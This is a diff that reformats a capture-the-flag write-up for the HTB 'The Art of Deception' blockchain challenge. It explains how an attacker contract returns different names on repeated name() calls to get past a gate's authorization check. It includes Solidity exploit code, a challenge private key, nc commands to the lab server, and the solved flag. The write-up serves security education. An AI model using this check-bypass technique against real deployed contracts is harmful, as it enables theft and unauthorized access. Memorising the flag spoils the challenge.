@@ -1,8 +1,21 @@
-Environment
+# Cyber Apocalypse 2023
+
+## The Art of Deception
+
+> Your cyborg abilities are not always the most effective tools for achieving your goals. Sometimes, you need to go unnoticed and blend in with your surroundings. To achieve this, you must learn to assume new identities and blend in with different groups of people. Mastering the art of deception requires subtlety, observation, and the ability to read people's motivations and intentions. After completing this training, you will emerge as a skilled infiltrator, capable of seamlessly blending in with your surroundings and achieving your objectives with stealth and subtlety. Can you bypass the High Security Gate and sneak into the Fortified Perimeter?
+>
+>  Readme Author: [sirius-a](https://sirius-a.github.io/ctf-writeups/2023/HTB-cyber-apocalypse)
+>
+> [`blockchain_the_art_of_deception.zip`](blockchain_the_art_of_deception.zip)
+
+# Environment
+```
 IP1=159.65.62.241:31090
 IP2=159.65.62.241:32094
+```
 Connect to IP2 to get the connection details:
 
+```
 $ nc 165.232.108.200 32094
 1 - Connection information
 2 - Restart Instance
@@ -13,14 +26,16 @@ Private key     :  0xaed670f921dc66aa949185dac3a38f78638807bb0932b03404732034316
 Address         :  0xD91878cAF52230be2645862A639487953a04Dadd
 Target contract :  0x5337a93f98ae379b878fB4969Ec9370B83CF5618
 Setup contract  :  0x7B59De9FdAd4b0A4B0366677A971A41E24132DBF
-Win Condition (Study the Smart Contract)
+```
+# Win Condition (Study the Smart Contract)
 In the Setup contract we see that in order to solve this challenge, the last person to enter a high security gate needs to be named "Pandora".
-
+```
 function isSolved() public view returns (bool) {
   return TARGET.strcmp(TARGET.lastEntrant(), "Pandora");
 }
+```
 The Smart Contract ensures, that we shoot these shots in order (first, second, third). Info modifier
-
+```
 pragma solidity ^0.8.18;
 
 
@@ -53,16 +68,18 @@ contract HighSecurityGate {
         return keccak256(abi.encodePacked(_str1)) == keccak256(abi.encodePacked(_str2)); 
     }
 }
+```
 After studying the Smart Contact in detail, we find the vulnerability is most likely in the enter function:
-
+```
 function enter() external {
   Entrant _entrant = Entrant(msg.sender);
 
   require(_isAuthorized(_entrant.name()), "Intruder detected");
   lastEntrant = _entrant.name();
 }
-The entrant is set to a value we have control over. It is derived from msg.sender. In Solidity msg.sender means the "The entity that sent me this request". So we can manipulate the _entrant.name() by creating a Smart Contact that interacts with the HighSecurityGate Contract:
-
+```
+The entrant is set to a value we have control over. It is derived from msg.sender. In Solidity msg.sender means the "The entity that sent me this request". So we can manipulate the \_entrant.name() by creating a Smart Contact that interacts with the HighSecurityGate Contract:
+```
 pragma solidity ^0.8.18;
 
 # Copied from HighSecurityGate
@@ -79,28 +96,30 @@ contract Attacker is Entrant {
   }
 
 }
+```
 To call the already deployed Smart Contract, I followed the example from here: https://solidity-by-example.org/calling-contract/.
 
 Lets add a method with a parameter pointing to the TARGET contract and call enter() on it:
-
+```
 import {HighSecurityGate} from "./FortifiedPerimeter.sol";
-
-...
 
 function callSecGate(HighSecurityGate _gate) external {
   _gate.enter();
 }
+```
 With this we can access the Gate as "Orion".
 
-Prepare the Exploit
-If we look at the HighSecurityGate again, we notice that _entrant.name() is called two separate times.
+# Prepare the Exploit
+If we look at the HighSecurityGate again, we notice that \_entrant.name() is called two separate times.
 
+```
 require(_isAuthorized(_entrant.name()), "Intruder detected");
 lastEntrant = _entrant.name();
-Once to check if the entrant is authorized and once again to save the name of the last person that entered the gate. Notice that there is no check if _entrant.name() returns the same value twice. This is our attack vector >:D.
+```
+Once to check if the entrant is authorized and once again to save the name of the last person that entered the gate. Notice that there is no check if \_entrant.name() returns the same value twice. This is our attack vector >:D.
 
 We adjust our Attacker smart contact so name return something different the second time it is called.
-
+```
 pragma solidity ^0.8.18;
 
 interface Entrant {
@@ -129,7 +148,8 @@ contract Attacker is Entrant {
    firstCheck = true;
   }
 }
-Execute the Plan
+```
+# Execute the Plan
 To compile and deploy our Attacker Contact, I used the Remix VSCode extension.
 
 ![](use-compile-and-deploy.png)
@@ -150,10 +170,11 @@ Result:
 ![](attack-transaction-ok.png)
 
 With this we can collect our reward:
-
+```
 nc 159.65.62.241 32094
 1 - Connection information
 2 - Restart Instance
 3 - Get flag
 action? 3
-HTB{...}
+HTB{H1D1n9_1n_PL41n_519H7}
+```
